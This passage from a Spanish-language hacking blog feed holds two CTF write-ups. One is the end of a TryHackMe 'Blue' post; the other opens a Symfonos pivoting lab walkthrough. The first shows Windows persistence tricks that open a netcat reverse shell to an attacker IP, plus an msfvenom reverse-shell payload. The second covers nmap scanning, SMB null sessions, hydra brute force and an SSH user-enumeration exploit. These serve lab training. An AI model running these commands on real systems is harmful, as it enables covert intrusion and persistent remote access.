+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe&quot; /v Debugger /f</span><br></pre></td></tr></table></figure></div>
+
+<p>Si nos ponemos en escucha por el puerto 443 y abrimos el explorador de archivos veremos lo siguiente:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/obtain_reverse_shell_open_explorer.png"
+                      alt="Obteniendo una reverse shell al abrir el explorador de archivos."
+                ><figcaption>Obteniendo una reverse shell al abrir el explorador de archivos.</figcaption></figure></p>
+<p>Cómo podeis ver es un poco bastante cantoso, porque se ve la terminal y indica que el comando _explorer no se ha reconocido, según la aplicación que utiliceis se mostrará de una manera u otra. No es recomendable para casos de auditorías reales donde se busque la descripción. Normalmente es útil identificar que aplicaciones son las que abre el usuario constantemente(por ejemplo el office) y realizar algo así, pero más camuflado.</p>
+<p>Cuando se cierra la aplicación se cierra el proceso de la cmd, tienes que buscar la manera rápida de poner el proceso en segundo plano o directamente hacerlo al enviar el comando de netcat.</p>
+<h2 id="2-Cuando-se-cierra-un-programa-que-nos-de-una-shell"><a href="#2-Cuando-se-cierra-un-programa-que-nos-de-una-shell" class="headerlink" title="2. Cuando se cierra un programa que nos de una shell."></a>2. Cuando se cierra un programa que nos de una shell.</h2><p>Esta última opción, desconozco el motivo, pero <strong>no consigue darme una shell</strong>, dejo por aquí cómo sería el código.</p>
+<p>Vamos a indicar que cuando se cierre el bloc de notas(notepad) nos de una shell:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d <span class="number">512</span> </span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d <span class="number">1</span></span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Windows\Temp\postExplotacion\nc.exe -e C:\Windows\System32\<span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> <span class="number">443</span>&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3-Utilizando-los-eventos-WMI-para-ejecutar-una-tarea-en-intervalos-regulares-de-tiempo"><a href="#3-Utilizando-los-eventos-WMI-para-ejecutar-una-tarea-en-intervalos-regulares-de-tiempo" class="headerlink" title="3. Utilizando los eventos WMI para ejecutar una tarea en intervalos regulares de tiempo."></a>3. Utilizando los eventos WMI para ejecutar una tarea en intervalos regulares de tiempo.</h2><p>Está es la mejor de las tres porque es la manera más “sigilosa”, vamos a hacer que <strong>cada minuto</strong> mande una shell a nuestro equipo, pero antes de eso</p>
+<p>Creación de binario para reverse shell con msfvenom:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> LPORT=<span class="number">443</span> -f exe -o persistencia.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Una vez transferido con certutil(no hace falta ofuscarlo) vamos a ejecutar el binario y nos ponemos en escucha en nuestro equipo para comprobar que esta correcto y llega la shell.</p>
+<p>Una vez comprobado que llega la shell, vamos a introducir los siguientes registros:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic /NAMESPACE: &quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter CREATE Name=&quot;persistence&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN <span class="number">60</span> WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer CREATE Name=&quot;persistence&quot;, ExecutablePath=&quot;C:\Windows\Temp\postExplotacion\persistencia.exe&quot;,CommandLineTemplate=&quot;C:\Windows\Temp\postExplotacion\persistencia.exe&quot; </span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __FilterToConsumerBinding CREATE Filter=&quot;___EventFilter.Name=&quot;persistence&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=&quot;persistence&quot;&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>Nos ponemos en escucha con netcat como siempre y si esperamos un minuto nos da una consola del usuario Administrator. </p>
+<h1 id="Conclusiones-finales"><a href="#Conclusiones-finales" class="headerlink" title="Conclusiones finales"></a>Conclusiones finales</h1><p>Podéis apreciar como se ha podido complicar una simple máquina “Easy”(fácil) cuando te despegas de Metasploit y te metes más en el barro para saber que está pasando, está metodología se utiliza para un mayor control de las situaciones y donde el metasploit no llega, la explotación manual es completamente válida para una certificación como OSCP. Espero que os haya gustado esta máquina y hayáis aprendido tanto como yo en el camino o más:).</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>tryhackme</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>tryhackme</tag>
+        <tag>easy</tag>
+        <tag>windows</tag>
+        <tag>eternalblue</tag>
+        <tag>ms17-010</tag>
+        <tag>eJPT</tag>
+        <tag>metasploit</tag>
+        <tag>manual exploitation</tag>
+        <tag>triple z script&quot;</tag>
+        <tag>AutoBlue</tag>
+        <tag>mimikatz</tag>
+        <tag>Windows Defender Evasion</tag>
+        <tag>Ebowla</tag>
+        <tag>enable RDP with netexec</tag>
+        <tag>windows persistence</tag>
+        <tag>persistence with debugging</tag>
+        <tag>persistence with gflags</tag>
+        <tag>persistence with WMI Events</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Symfonos 1 y 2 | Pivoting I</title>
+    <url>/2024/12/04/Symfonos%201%20y%202/</url>
+    <content><![CDATA[<h1 id="Introduccion-al-Pivoting"><a href="#Introduccion-al-Pivoting" class="headerlink" title="Introducción al Pivoting."></a>Introducción al Pivoting.</h1><p>Bueenos días&#x2F;tardes&#x2F;noches hackerss, hoy vamos a montarnos un laboratorio de máquinas vulnerables para aprender un poco de <strong>Pivoting(Moverse lateralmente para comprometer otro dispositivo)</strong>.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/diagrama-introducci%C3%B3n.png"
+                      class="" title="Diagrama introductorio."
+                >
+
+<p>¿Y cómo saltas de Symfonos 1 a Symfonos 2?.<br>Symfonos 1 es capaz de ver a Symfonos 2 gracias a otra <strong>tarjeta de red</strong> que permite ver otras máquinas, en este caso Symfonos 2.</p>
+<p>Una vez entendido el concepto vamos a realizar la configuración del laboratorio.</p>
+<h1 id="Configuracion-del-laboratorio"><a href="#Configuracion-del-laboratorio" class="headerlink" title="Configuración del laboratorio"></a>Configuración del laboratorio</h1><p>Partimos de las máquinas ya preparadas en <strong>VirtualBox</strong> con modo puente. Al realizar un escaneo de red se pueden ver las dos máquinas y esa no es la idea, para solucionar esto vamos a configurar una <strong>red NAT</strong>, para ello vamos al siguiente apartado de configuración: Máquina &gt; Herramientas &gt; Administrador de red y la pestaña de redes NAT, ahí le damos a crear y en mi caso voy a utilizar el rango <strong>192.168.100.0&#x2F;24</strong>.</p>
+<p>El siguiente paso es añadir un Adaptador de red extra a Symfonos uno, indicándole que sea de tipo red NAT y exactamente la creada por nosotros. Actualmente deberemos tener dos tarjetas de red, la primera modo puente y la segunda red NAT.</p>
+<p>En la configuración de red de Symfonos2 debemos sustituir el modo puente por el modo NAT indicado y así las dos máquinas podrían verse entre ellas.</p>
+<p>Ahora si levantamos las dos máquinas y realizamos un escaneo podemos apreciar que solo vemos una máquina(Symfonos1)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan -I wlan0 -l</span><br></pre></td></tr></table></figure></div>
+
+<p>Recomiendo realizar una <strong>instantánea</strong> de cada máquina por si tenemos cualquier problema no tener que volver a realizar el mismo proceso.</p>
+<h1 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h1><h2 id="Preparacion-de-directorios"><a href="#Preparacion-de-directorios" class="headerlink" title="Preparación de directorios."></a>Preparación de directorios.</h2><p>Como buen hacker perezoso que soy dispongo de una pequeña función(en este caso en mi zshrc, podías utilizarlo en la bashrc) que me crea los directorios de trabajo para no ir uno a uno(Idea obtenida de s4vitar)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">mkt</span></span> () &#123;</span><br><span class="line">	<span class="built_in">mkdir</span> &#123;recog,play,data&#125;</span><br><span class="line">	<span class="built_in">touch</span> <span class="string">&quot;<span class="subst">$(pwd | awk -F <span class="string">&quot;/&quot;</span> &#x27;&#123;print $NF&#125;&#x27;)</span>-write-up.md&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>Podéis poner lo que queráis, en este caso tengo tres directorios y un fichero write-up.md con el nombre de la carpeta padre(Symfonos-write-up.md)</p>
+<h2 id="Escaneo-red-interna"><a href="#Escaneo-red-interna" class="headerlink" title="Escaneo red interna"></a>Escaneo red interna</h2><p>El escaneo de red ya lo hemos realizado antes con <strong>arp-scan</strong>, también podemos utilizar otras herramientas cómo <strong>netdiscover</strong>. Recordar que esto es un CTF, estamos usando modos activos que generar mucha traza y en un entorno real pueden levantar sospechas y ser detectado, en un entorno real un método sería mantenerse a la escucha analizando la red y ir obteniendo información de los equipos.</p>
+<h2 id="¿Equipo-operativo"><a href="#¿Equipo-operativo" class="headerlink" title="¿Equipo operativo?"></a>¿Equipo operativo?</h2><p>Le lanzamos una traza ICMP(un ping de toda la vida) para comprobar la operatividad del equipo víctima.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 1 192.168.1.178</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/ping.png"
+                      class="" title="Uso de ping para comprobar si tenemos comunicación con la víctima"
+                >
+
+<p>En la imagen se puede apreciar que el <strong>ttl&#x3D;64</strong>, si miramos está <a class="link"   href="https://subinsb.com/default-device-ttl-values/" >página<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> podemos ver que cada sistemas operativo tiene un tiempo de respueta <strong>por defecto</strong>, esto no significa que haya podido ser modificado. </p>
+<h2 id="Escaneo-de-puertos"><a href="#Escaneo-de-puertos" class="headerlink" title="Escaneo de puertos"></a>Escaneo de puertos</h2><p>Disponemos de veintemil herramientas de escaneo de puertos, aquí solo voy a realizar la enumeración de forma activa</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --open -sS --min-rate=4500 -vvv -n -Pn 192.168.1.178 -oG ToLosPuertos</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><p><strong>-p-</strong> -&gt; Escaneamos todo el rango de purtos(0-65535).</p>
+</li>
+<li><p><strong>–open</strong> -&gt; Indicamos que solo queremos mostrar los que están abiertos.</p>
+</li>
+<li><p><strong>-sS</strong> -&gt; Uso de Syn Scan o también conocido cómo half-open scan. En lugar de completar el <strong>three-way-hanshake</strong>(SYN -&gt; SYN&#x2F;ACK -&gt; ACK) el escaneo <strong>envía un paquete RST</strong> tras recibir el SYN&#x2F;ACK identificado puertos rápidamente y reduciendo la posibilidad de ser detectados por un firewall(aunque esto nos da igual ahora).  </p>
+</li>
+<li><p><strong>–min-rate&#x3D;4500</strong> -&gt; Establece la <strong>tasa mínima de paquetes enviados</strong>. No recomiendo subir más porque puede provocar que se salte puertos.</p>
+</li>
+<li><p><strong>-vvv</strong> -&gt; Triple verbose. Queremos que nos de un chorro de información por la consola.</p>
+</li>
+<li><p><strong>-n</strong> -&gt; Evitamos la resolución DNS(No intentará convertira la ip en nombre de dominio).</p>
+</li>
+<li><p><strong>-Pn</strong> -&gt; Desactivar la opción <strong>host discovery</strong>. Esto significa en cristiano que comprueba si el host está encencido antes de escanearlo(lo hemos antes con el ping).</p>
+</li>
+<li><p><strong>-oG</strong> -&gt; Exportamos la información obtenida en un archivo con formato grepeable(que a continuación veréis porque).</p>
+</li>
+</ul>
+<p>Dispones de otras alternativas como <a class="link"   href="https://github.com/projectdiscovery/naabu" >naabu<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> de projectdiscovery que también es muy potente.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">naabu -Pn -host 192.168.1.178</span><br></pre></td></tr></table></figure></div>
+
+<p>Vamos a utilizar extractPorts, otra función definida en la zshrc robada a s4vitar para mostrar los puertos encontrados y copiarlos a la clipboard(recuerdo que estoy utilizando Arch Linux con Hyprland por eso utilizo wl-copy, si utilizas kali linux&#x2F;parrot deberías cambiarlo a xclip -sel clipboard)</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/extractPorts.png"
+                      class="" title="Uso de la utilidad extractPorts"
+                >
+
+<h3 id="Servicios-y-versiones-de-los-puertos"><a href="#Servicios-y-versiones-de-los-puertos" class="headerlink" title="Servicios y versiones de los puertos"></a>Servicios y versiones de los puertos</h3><p>Una vez copiados en la clipboard vamos a buscar la versión y el servicio extra que corren sobre dichos puertos.</p>
+<p>Para ello vamos a lanzar unos script básicos de reconocimiento.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sCV -p22,25,80,139,445 192.168.1.178 -oN targeted</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/escaneo_servicios.png"
+                      class="" title="Escaneo de versión y servicios de los puertos detectados."
+                >
+
+<p>TIP!</p>
+<p>Podemos sacar el codename(nombre informal de la versión) de la máquina víctima, para ello vemos que en la línea del puerto ssh, en la versión nos aparece esto:</p>
+<ul>
+<li>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li>
+</ul>
+<p>Y si buscamos esto en Google? -&gt; OpenSSH 7.4p1 Debian 10+deb9u6.</p>
+<p>Query de Google -&gt; launchpad OpenSSH 7.4p1 Debian 10+deb9u6</p>
+<p>En mi caso, en el primer resultado de búsqueda, al darle podemos apreciar que es un <strong>Debian Stretch</strong>.</p>
+<p>Más abajo tenemos el puerto 80 de http, podemos realizar lo mismo y en caso de que no sea el mismo codename o otro SO <strong>podríamos pensar que hay contenedores con Docker</strong> pero no es el caso.</p>
+<p>Antes de abrir el navegador para ver que ahí(se que estáis deseosos pillines) podéis usar si os interesa la herramienta <strong>whatweb</strong> que es como la extensión Wappalyzer, pero desde consola:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">whatweb http://192.168.1.178</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/whatweb.png"
+                      class="" title="Uso de la herramienta whatweb"
+                >
+
+<h2 id="Primera-exploracion-desde-el-navegador"><a href="#Primera-exploracion-desde-el-navegador" class="headerlink" title="Primera exploración desde el navegador"></a>Primera exploración desde el navegador</h2><p>Abrimos el navegador y vemos las tecnologías utilizadas con Wappalizer, podemos ver que la versión de apache no es la última(está es la 2.4.62) y podemos buscar diferentes cve en <a class="link"   href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=apache+2.4.25" >cve mitre<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Podemos apreciar diferentes vulnerabilidades aunque no nos servirían para la explotación de la máquina, además, los tiros no van por aquí.</p>
+<p>Revisamos el código fuente de la página(ctrl + u), vacío, no voy a poner ni una captura.</p>
+<p>La consola y sus diferentes herramientas, tampoco vemos nada por ningún sitio.</p>
+<h2 id="Listar-recursos-compartidos-de-Samba"><a href="#Listar-recursos-compartidos-de-Samba" class="headerlink" title="Listar recursos compartidos de Samba"></a>Listar recursos compartidos de Samba</h2><p>Si vemos el archivo del escaneo de puertos anterior, podemos ver el puerto 139 y el 445 incluso que la autenticación esta activada, pero no se pide.</p>
+<p>Podemos probar a listar los recursos compartidos con smbmap:</p>
+<h3 id="Uso-de-smbmap-fallido"><a href="#Uso-de-smbmap-fallido" class="headerlink" title="Uso de smbmap(fallido)"></a>Uso de smbmap(fallido)</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.1.178</span><br></pre></td></tr></table></figure></div>
+
+<p>En este caso, dado un problema no encontrado a día de hoy con la herramienta no podemos utilizarla, pero no pasa ni media chicosss tenemos un montón de alternativas.</p>
+<h3 id="Null-session-con-smbclient"><a href="#Null-session-con-smbclient" class="headerlink" title="Null session con smbclient"></a>Null session con smbclient</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //192.168.1.178 -N  </span><br></pre></td></tr></table></figure></div>
+
+<p>De esta forma no podremos ver los permisos directamente como con smbmap</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/smbclient_1.png"
+                      class="" title="Uso de smbclient para ver los recursos"
+                >
+
+<p>Podemos acceder y ver el contenido del directorio anonymous:</p>
+<p>Nos debemos de meter dentro del recurso compartido:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.1.178/anonymous -N</span><br></pre></td></tr></table></figure></div>
+
+<p>Y ahora podemos hacer un ls y ver los archivos, consecutivamente utilizamos el comando get para traernos el archivo a nuestro sistema local.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">get attention.txt</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/archivo_attention_smb.png"
+                      class="" title="Descargar el archivo attention.txt desde smb"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/contenido_attention_smb.png"
+                      class="" title="Contenido del archivo attention.txt"
+                >
+
+<p>Pues viendo este mensaje realista podemos apreciar tres posibles contraseñas y un usuario. También estas contraseñas me suenan a rockyou… aunque no se si tendrá algún sentido en el futuro. De momento nos apuntamos las contraseñas en un archivo passwords.txt y el usuario en usernames.txt.</p>
+<p>Recordamos que esta máquina tiene el servicio ssh abierto, podmeos realizar un ataque por fuerza bruta para ver si algunas de estas contraseñas es válido para dicho usuario(y si cuela, recuerda que estamos en un CTF)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l zeus -p passwords.txt</span><br><span class="line">hydra -l Zeus -p passwords.txt</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/primer_intento_zeus_ssh_fuerza_bruta.png"
+                      class="" title="Fuerza bruta con hydra a el usuario Zeus."
+                >
+
+<h2 id="Enumeracion-de-usuario-mediante-SSH"><a href="#Enumeracion-de-usuario-mediante-SSH" class="headerlink" title="Enumeración de usuario mediante SSH"></a>Enumeración de usuario mediante SSH</h2><p>En el archivo tarteged podemos apreciar que la versión de ssh es menor a la <strong>7.7</strong>, esto significa que nos permite enumerar usuarios de forma válida, para ellos utilizamos searchsploit:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ssh user enumeration </span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/searchsploit_ssh_user_enum.png"
+                      class="" title="Exploit en python para la enumeración de usuarios."
+                >
+
+<p>Aunque sea una versión inferior, esta vulnerabilidad puede estar <strong>parcheada igualmente</strong>, pero vamos a comprobarlo. </p>
+<p>Nos lo descargamos con:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -m linux/remote/45939.py</span><br></pre></td></tr></table></figure></div>
+
+<p>En mi caso lo voy a renombrar con un nombre más identificable a primera vista(ssh_enum_user.py)</p>
+<p>Voy a tener que utilizar un entorno virtual porque en arch no deja utilizar pip con el fin de no ocasionar conflictos con los paquetes del sistema. </p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Instalamos virtualenv para python2</span></span><br><span class="line"><span class="built_in">sudo</span> pacman -S python2-virtualenv</span><br><span class="line"></span><br><span class="line"><span class="comment"># Una dependencia que hace falta para que el entorno virtual funcione</span></span><br><span class="line"><span class="built_in">sudo</span> pacman -S python2-typing</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creamos el entorno</span></span><br><span class="line">python2 -m virtualenv entorno</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nos colocamos dentro del entorno virtual</span></span><br><span class="line"><span class="built_in">source</span> entorno/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># Instalamos la dependencia paramiko para ejecutar el script</span></span><br><span class="line">pip install paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nos saldrá un error de paramiko aunque se puede ejecutar igual</span></span><br><span class="line">python2 ssh_enum_user.py 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+
+<p>Y ahora podemos comprobar si es válido la enumeración de usuarios a través de sss:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 ssh_enum_user.py 192.168.1.178 root 2&gt;/dev/null</span><br><span class="line">python2 ssh_enum_user.py 192.168.1.178 rogsfdkjgsdfot 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/ssh_attempt_valid_user_failed.png"
+                      class="" title="Intento fallido de enumeración de usuarios."
+                >
+
+<p>Podemos apreciar que no funciona, así que a otra cosa mariposa.</p>
+<p>Para salir del entorno virtual usa la palabra <strong>deactivate</strong>.</p>
+<h2 id="Acceso-al-usuario-helios-desde-samba"><a href="#Acceso-al-usuario-helios-desde-samba" class="headerlink" title="Acceso al usuario helios desde samba"></a>Acceso al usuario helios desde samba</h2><p>Cuando nos conectamos con smbclient, vimos un recurso compartido llamado <strong>helios</strong> y en el comentario decia “Helios personal share”</p>
+<p>¿Y si probamos a conectarnos con helios a dicho recurso usando el protocolo smb?<br>Lo primero de todo es añadirlo a nuestro “diccionario” de usuarios, a continuación, probamos a conectarnos y probamos las contraseñas(en este caso podemos una a una porque son tres)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //192.168.1.178/helios -U helios</span><br></pre></td></tr></table></figure></div>
+
+<p>Y con la contraseña <strong>qwerty</strong> vemos que nos deja listar. A continuación procedemos a entrar como dicho usuario.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.1.178/helios -U helios</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Descargamos todos los archivos.</span></span><br><span class="line">mget *</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/helios_file_smb.png"
+                      class="" title="Acceso y descargas de archivos en el directorio helios"
+                >
+
+<p>En el archivo <strong>todo.txt</strong> podemos encontrar diferente información:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/contenido_todo_helios.png"
+                      class="" title="Contenido del archivo todo."
+                >
+
+<p>De aquí nos fijamos en el directorio encontrado y lo abrimos en el navegador.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/primer_vistazo_wordpress_helios.png"
+                      class="" title="Primer vistazo de la página wordpress"
+                >
+
+<p>¿Pero porque se ve así de feo?</p>
+<h2 id="Virtual-hosting"><a href="#Virtual-hosting" class="headerlink" title="Virtual hosting"></a>Virtual hosting</h2><p>Si hacemos ctrl+u para ver el código fuente opdemos encontrar que esta cargado los recursos desde <strong>symfonos.local</strong>, pero claro, mi equipo no conoce este dominio.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/ping_symfonos_local.png"
+                      class="" title="ping fallido a symfonos local"
+                >
+
+<p>Para solucionar esto deberemos modificar el &#x2F;etc&#x2F;hosts de nuestro equipo y añadir dicho nombre de dominio.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/a%C3%B1adir_symfonos_local_etc_hosts.png"
+                      class="" title="Añadimos symfonos.local al &#x2F;etc&#x2F;hosts"
+                >
+
+<p>Ya solo con recargar la página web podemos apreciar que cargan los recursos y podemos hacer ping perfectamente.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/wordpress_cargado_symfonos.png"
+                      class="" title="Wordpress cargado."
+                >
+
+<p>En la página podemos apreciar que el post lo ha realizado admin, entonces ya sabemos que es un usurio válido.</p>
+<p>Podemos abrir wappalyzer y vemos la versión de wordpress y jquery, podemos apreciar que son algo obsoletas y tienen expuestas algunas vulnerabilidades, aunque no nos interesa para resolver este CTF.</p>
+<h2 id="Enumeracion-de-plugins-de-Wordpress"><a href="#Enumeracion-de-plugins-de-Wordpress" class="headerlink" title="Enumeración de plugins de Wordpress"></a>Enumeración de plugins de Wordpress</h2><p>En lugar de utilizar WPScan y automatizar las cosas vamos a seguir de <strong>forma manual,</strong> puede ser algo más tedioso y complicado para algunas personas, pero si quieres ser un buen hacker debes acostumbrarte a seguir esta metodología.</p>
+<p>Empezamos comprobando si el directorio <strong>&#x2F;wp-content&#x2F;plugins&#x2F;</strong> tiene capacidad de directory listening, pero este esta vacío.</p>
+<p>Si volvemos al código fuente podemos enumerar alguno de ellos a simple vista(ojo no tiene porque aparecer todos los plugins en el código fuente). Podemos utilizar este oneliner para recoger todos estos plugins.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s -X GET <span class="string">&quot;http://192.168.1.178/h3l105/&quot;</span> | grep <span class="string">&quot;wp-content&quot;</span> | grep -oP <span class="string">&quot;&#x27;.*?&#x27;&quot;</span> | grep <span class="string">&quot;symfonos.local&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1-7 | <span class="built_in">sort</span> -u | grep plugins</span><br></pre></td></tr></table></figure></div>
+
+<ol>
+<li><strong>curl -s -X GET</strong> -&gt; Realizamos una petición con el modo silencioso(-s) y por el método GET(-X)</li>
+<li><strong>grep “wp-content”</strong> -&gt; Obtenemos las líneas que contengan <strong>wp-content</strong>.</li>
+<li><strong>grep -oP “‘.*?’”</strong>* -&gt; Expresión regular para ibtenemos todo el contenido que está entre comillas siples(‘’).</li>
+<li><strong>grep “symfonos.local”</strong> -&gt; Nos quitamos otros matches no deseados.</li>
+<li><strong>cut -d ‘&#x2F;‘ -f 1-7</strong> -&gt; Utilizamos cut con delimitador(-d) para indicar que queremos que nos muestre <strong>hasta</strong> la séptima barra.</li>
+<li><strong>sort -u</strong> -&gt; Ordenamos alfabéticamente y quitamos los matches repetidos.</li>
+<li><strong>grep plugins</strong> -&gt; Filtramos por plugins.</li>
+</ol>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/enumeracion_plugins.png"
+                      class="" title="Enumeración de plugins manual."
+                >
+
+<p>¿mail-masta?<br>En el escaneo de puertos vimos el puerto 25 abierto, <strong>SMTP servicio de correo electrónico</strong>.</p>
+<h1 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>Dadas estas coincidencias podemos buscar con <code>searchsploit</code> dicho plugin.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit mail masta</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
